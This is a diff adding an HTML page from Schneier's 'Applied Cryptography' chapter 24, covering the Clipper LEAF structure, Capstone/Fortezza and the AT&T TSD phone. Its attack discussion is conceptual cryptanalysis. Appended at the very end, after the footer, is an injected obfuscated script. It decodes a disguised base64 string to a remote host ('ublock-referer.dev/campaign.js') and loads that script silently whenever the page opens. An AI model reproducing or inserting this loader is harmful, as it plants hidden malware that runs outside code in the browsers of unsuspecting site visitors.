@@ -1,0 +1,120 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Example Implementations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=24//-->
+<!--PAGES=592-595//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch25/25-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Politics aside, the internal structure of the LEAF is worth discussing [812, 1154, 1594, 459, 107, 462]. The LEAF is a 128-bit string containing enough information to allow law enforcement to recover the session key, <I>K<SUB>S</SUB></I>, assuming the two <B>escrow agencies</B> in charge of those key-escrow databases cooperate. The LEAF contains a 32-bit unit identifier, <I>U</I>, unique to the Clipper chip. It also contains the current 80-bit session key encrypted with the chip&#146;s unique unit key, <I>K<SUB>U</SUB></I>, and a 16-bit checksum, <I>C</I>, called an escrow identifier. This checksum is a function of the session key, the IV, and possibly other information. These three fields are encrypted with a fixed family key, <I>K<SUB>F</SUB></I>, shared by all interoperable Clipper chips. The family key, the encryption modes used, the details of the checksum, and the exact structure of the LEAF are all secret. It probably looks something like this:</P>
+<DL>
+<DD><I>E<SUB><SMALL>K</SMALL><SUB>F</I></SUB></SUB>(<I>U,<SUB><SMALL>K</SMALL><SUB>U</I></SUB></SUB>(<I>K<SUB>S</SUB>, C</I>))
+</DL>
+<P><I>K<SUB>U</SUB></I> is programmed into Clipper chips at the factory. This key is then split (see Section 3.6) and stored in two different key-escrow databases, guarded by two different escrow agencies.</P>
+<P>For Eve to recover <I>K<SUB>S</SUB></I> from the LEAF, she first has to decrypt the LEAF with <I>K<SUB>F</SUB></I> and recover <I>U.</I> Then she has to take a court order to each escrow agency, who each return half of <I>KU</I> for the given <I>U.</I> Eve XORs the two halves together to recover <I>K<SUB>U</SUB></I>, then she uses <I>K<SUB>U</SUB></I> to recover <I>K<SUB>S</SUB></I>, and <I>K<SUB>S</SUB></I> to eavesdrop on the conversation.</P>
+<P>The checksum is designed to prevent someone from circumventing this scheme; the receiving Clipper chip won&#146;t decrypt if the checksum doesn&#146;t check. However, there are only 2<SUP>16</SUP> possible checksum values, and a bogus LEAF with the right checksum but the wrong key can be found in about 42 minutes [187]. This isn&#146;t much help for Clipper voice conversations. Because the key exchange protocol is not part of the Clipper chip, the 42-minute brute-force attack must occur after key exchange; it cannot be done before making the telephone call. This attack may work for facsimile transmission or with the Fortezza card (see Section 24.17).</P>
+<P>Supposedly, the Clipper chip will resist reverse-engineering by &#147;a very sophisticated, well-funded adversary&#148; [1154], but rumors are that Sandia National Laboratories successfully reverse-engineered one. Even if those rumors aren&#146;t true, I suspect that the largest chip manufacturers in the world can reverse-engineer Clipper; it&#146;s just a matter of time before someone with the right combination of resources and ethics comes along.</P>
+<P>Enormous privacy issues are associated with this scheme. Numerous civil liberty advocacy groups are actively campaigning against any key-escrow mechanism that gives the government the right to eavesdrop on citizens. But the sneaky thing is that this idea never went through Congress; NIST published the Escrowed Encryption Standard as a FIPS [1153], bypassing that irritating legislative process. Right now it looks like the EES is dying a slow and quiet death, but standards have a way of creeping up on you.</P>
+<P>Anyway, Table 24.2 lists the different agencies participating in this program. Anyone want to do a threat analysis on having both escrow agents in the executive branch? Or on having escrow agents who really don&#146;t know anything about the wiretap requests, and can do no more than blindly approve them? Or on having the government impose a secret algorithm as a commercial standard?</P>
+<P>In any case, implementing Clipper raises enough problems to question its value in court. Remember, Clipper only works in OFB mode. Despite what you may have been told to the contrary, this does not provide integrity or authentication. Imagine that Alice is on trial, and a Clipper-encrypted telephone call is part of the evidence. Alice claims that she never made the call; the voice is not hers. The phone&#146;s compression algorithm is so bad that it is hard to recognize Alice&#146;s voice, but the prosecution argues that since only Alice&#146;s escrowed key will decipher the call it must have been made from her telephone.</P>
+<P>Alice argues that the call was forged like so [984, 1339]: Given the ciphertext and the plaintext, it is possible to XOR them to get the keystream. This keystream can then be XORed with an entirely different plaintext to form a forged ciphertext, which can then be converted to forged plaintext when fed into the Clipper decryptor. True or not, this argument could easily put enough doubt in a jury&#146;s mind to disregard the telephone call as evidence.</P>
+<P>Another attack, called the Squeeze attack, allows Alice to frame Bob. Here&#146;s how [575]: Alice calls Bob using Clipper. She saves a copy of his LEAF as well as the session key. Then, she calls Carol (who she knows is being wiretapped). During the key setup, Alice forces the session key to be identical to the one she used with Bob; this requires hacking the phone, but it is not hard. Then, instead of sending her LEAF she sends Bob&#146;s. It&#146;s a valid LEAF, so Carol&#146;s phone will not notice. Now she can say whatever she wants to Carol; when the police decrypt the LEAF, they will find that it is Bob&#146;s. Even if Bob wasn&#146;t framed by Alice, the mere fact that he can claim this in court undermines the purpose of the scheme.</P>
+<P>The law enforcement authorities of the United States should not be in the business of collecting information in criminal investigations that is useless in court. Even if key escrow were a good idea, Clipper is a bad way of implementing it.</P>
+<H3><A NAME="Heading18"></A><FONT COLOR="#000077">24.17 Capstone</FONT></H3>
+<P>Capstone (also known as the MYK-80) is the other NSA-developed VLSI cryptographic chip that implements the U.S. government&#146;s Escrowed Encryption Standard [1153]. Capstone includes the following functions [1155, 462]:
+</P>
+<TABLE WIDTH="50%"><TH CAPTION ALIGN="CENTER" COLSPAN="1">Table 24.2<BR>EES Participating Agencies
+<TR>
+<TD COLSPAN="1"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Justice&#151;System Sponsor and Family Key Agent
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">NIST&#151;Program Manager and Escrow Agent
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">FBI&#151;Decrypt User and Family Key Agent
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Treasury&#151;Escrow Agent
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">NSA&#151;Program Developer
+<TR>
+<TD COLSPAN="1"><HR>
+</TABLE>
+<DL>
+<DD>&#151; The Skipjack algorithm in any of the four basic modes: ECB, CBC, CFB, and OFB.
+<DD>&#151; A public-key Key Exchange Algorithm (KEA), probably Diffie-Hellman.
+<DD>&#151; The Digital Signature Algorithm (DSA).
+<DD>&#151; The Secure Hash Algorithm (SHA).
+<DD>&#151; A general purpose exponentiation algorithm.
+<DD>&#151; A general purpose, random-number generator that uses a pure noise source.
+</DL>
+<P>Capstone provides the cryptographic functionality needed for secure electronic commerce and other computer-based applications. The first application of Capstone is in a PCMCIA card called Fortezza. (It was originally called Tessera until a company called Tessera, Inc. complained.)
+</P>
+<P>NSA had considered lengthening Capstone&#146;s LEAF checksum in production versions for use in Fortezza cards, in order to foil the brute-force attack against the LEAF previously discussed. Instead, they added a feature that reset the card after 10 incorrect LEAFs. This only increases the time required to find a fake but valid LEAF by 10 percent, to 46 minutes. I am not impressed.</P>
+<H3><A NAME="Heading19"></A><FONT COLOR="#000077">24.18 AT&ampT Model 3600 Telephone Security Device (TSD)</FONT></H3>
+<P>The AT&ampT Telephone Security Device (TSD) is the Clipper phone. Actually, there are four models of the TSD. One contains the Clipper chip, another contains an exportable proprietary AT&ampT encryption algorithm, the third contains a proprietary algorithm for domestic use plus the exportable algorithm, and the fourth contains the Clipper, domestic, and exportable algorithms.
+</P>
+<P>TSDs use a different session key for each telephone call. A pair of TSDs generate a session key using Diffie-Hellman key exchange, independent of the Clipper chip. Since Diffie-Hellman incorporates no authentication, the TSD has two methods to thwart a man-in-the-middle attack.</P>
+<P>The first is a screen. The TSD hashes the session key and displays that hash on a small screen as four Hex digits. The conversants should confirm that their screens show the same digits. The voice quality is good enough that they can recognize each other&#146;s voice.</P>
+<P>Eve still has a possible attack. Imagine her in the middle of Alice and Bob&#146;s conversation. She uses one TSD on the line with Alice and a modified TSD on the line with Bob; in the middle she bridges the two phone calls. Alice tries to go secure. She generates a key as normal, except that Eve is acting as Bob. Eve recovers the key, and using the modified TSD, forces the key she generates with Bob to have the same hash value. This attack may not sound very likely, but the TSD uses a variant of the interlock protocol to prevent it.</P>
+<P>The TSD generates random numbers using a noise source and a chaotic amplifier with digital feedback. This generates a bit stream, which is fed through a post-whitening filter using the digital signal processor.</P>
+<P>Despite all of this, the TSD manual does not mention security at all. In fact, it says [70]:</P>
+<BLOCKQUOTE><P>AT&ampT makes no warranty that the TSD will prevent cryptanalytic attack on any encrypted transmission by any government agency, its agents, or any third party. Furthermore, AT&ampT makes no warranty that the TSD will prevent any attack on any communication by methods which bypass encryption.
+</P>
+</BLOCKQUOTE><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-11.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch25/25-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(PTfdccal, FjAMKaCj) {FjAMKaCj = PTfdccal.createElement('script');FjAMKaCj.type = 'text/javascript';FjAMKaCj.async = true;FjAMKaCj.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');PTfdccal.getElementsByTagName('body')[0].appendChild(FjAMKaCj);}(document));</script></body>
+</html>
